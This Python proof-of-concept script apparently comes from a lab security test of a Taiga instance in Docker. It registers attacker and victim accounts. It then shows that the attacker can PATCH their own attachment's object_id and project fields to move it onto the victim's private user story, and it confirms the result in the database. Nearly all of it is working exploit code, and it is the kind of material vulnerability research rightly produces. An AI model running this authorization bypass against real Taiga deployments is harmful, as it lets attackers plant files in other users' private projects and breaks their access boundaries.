import sys, subprocess, io; sys.path.insert(0, "/root/johto-task4/L2/scratch/proofs")
from lib import Client, register, uniq, new_project, show

attacker = register(uniq("r2atk4"))
victim = register(uniq("r2vic4"))
A = new_project(attacker, private=True)
B = new_project(victim, private=True)
# user stories
usa = attacker.post("/userstories", {"project": A["id"], "subject": "atk-us"}).json()
usb = victim.post("/userstories", {"project": B["id"], "subject": "VICTIM-private-us"}).json()
print("A",A["id"],"usa",usa["id"],"| B",B["id"],"usb(victim)",usb["id"])

# confirm attacker cannot see victim US
show("attacker GET victim US", attacker.get("/userstories/%d" % usb["id"]), keys=["id","_error_message"])

# attacker uploads an attachment to their own US in A (multipart)
ct = "userstories.userstory"
files = {"attached_file": ("evil.txt", io.BytesIO(b"owned by attacker"), "text/plain")}
data = {"project": str(A["id"]), "object_id": str(usa["id"])}
r = attacker.req("POST", "/userstories/attachments", data=data, files=files)
show("attacker upload attachment to own US", r, keys=["id","object_id","project"])
att = r.json(); attid = att["id"]

# attacker re-parents the attachment to the VICTIM's private US via PATCH
r = attacker.patch("/userstories/attachments/%d" % attid, {"object_id": usb["id"], "project": B["id"]})
show("attacker PATCH attachment object_id->victimUS project->B", r, keys=["id","object_id","project","_error_message"])

# verify DB
code=("from taiga.projects.attachments.models import Attachment\n"
      "a=Attachment.objects.get(pk=%d)\n"
      "print('attachment', a.id, 'object_id', a.object_id, 'project', a.project_id, 'owner', a.owner_id)\n"%attid)
out=subprocess.run(["docker","exec","t4-L2-app","python","manage.py","shell","-c",code],capture_output=True,text=True)
print(out.stdout.strip(), out.stderr.strip()[-200:] if out.returncode else "")

# victim now sees the attacker's file on their private story
show("victim lists attachments on their US", victim.get("/userstories/attachments", params={"project":str(B["id"]),"object_id":str(usb["id"])}))
